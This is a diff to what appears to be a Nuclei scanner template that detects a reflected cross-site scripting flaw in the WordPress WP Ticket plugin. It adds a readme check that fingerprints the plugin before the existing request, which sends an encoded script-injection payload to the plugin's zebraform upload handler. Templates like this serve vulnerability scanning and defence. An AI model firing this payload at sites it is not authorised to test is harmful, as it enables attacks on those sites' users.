@@ -14,10 +14,25 @@ info:
     cvss-score: 5.4
     cwe-id: CWE-80
   metadata:
-    max-request: 1
-  tags: wordpress,xss,wp,wpscan,intrusive
+    max-request: 2
+  tags: wordpress,xss,wp,wpscan,intrusive,vuln
+
+flow: http(1) && http(2)
 
 http:
+  - raw:
+      - |
+        GET /wp-content/plugins/wp-ticket/readme.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        internal: true
+        words:
+          - 'WP Ticket'
+          - 'Tags:'
+        condition: and
+
   - raw:
       - |
         POST /wp-content/plugins/wp-ticket/assets/ext/zebraform/process.php?form=%3C/script%3E%3Cimg%20src%20onerror=alert(document.domain)%3E&control=upload HTTP/1.1
@@ -47,5 +62,4 @@ http:
       - type: status
         status:
           - 200
-
-# digest: 4a0a00473045022100c03ef41c0ba961c72164701241b78da8d638eb78bb78c0169c5e649bdc9945b80220262a4dc87375607046a19c874994d591e04ead2b1f9e34a1ba678283b1f70eb1:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a0047304502202db18725f640ae381907a94beb780e535ae38c4edb87d685b71cdb97c35630bb022100eea33f7db202c5b3b356f858005cf9b5e497bfed21e5cf3928b2da8458c4f532:922c64590222798bb761d5b6d8e72950
